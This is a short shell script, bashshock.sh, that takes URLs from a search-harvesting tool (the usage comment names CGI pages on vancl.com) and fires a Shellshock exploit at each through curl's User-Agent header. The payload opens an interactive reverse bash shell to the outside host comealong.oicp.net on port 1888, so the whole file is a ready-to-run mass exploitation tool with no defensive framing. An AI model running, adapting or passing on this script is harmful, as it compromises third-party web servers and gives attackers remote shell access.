#!/bin/sh
# bashshock.sh -w ext:cgi vancl.com
ghack.py $@ | awk '{
	if (length($0) > 2 && substr($0, 1, 1) != "*") {
		sub(/\x0d/, "", $0)
		#print $0;
		shock = "\"() { :; }; /bin/bash -i > /dev/tcp/comealong.oicp.net/1888 0<&1 2>&1\" \"" $0 "\"";
		#print "curl -A" shock " -v";
		system("curl -A" shock " -v");
	}
}'
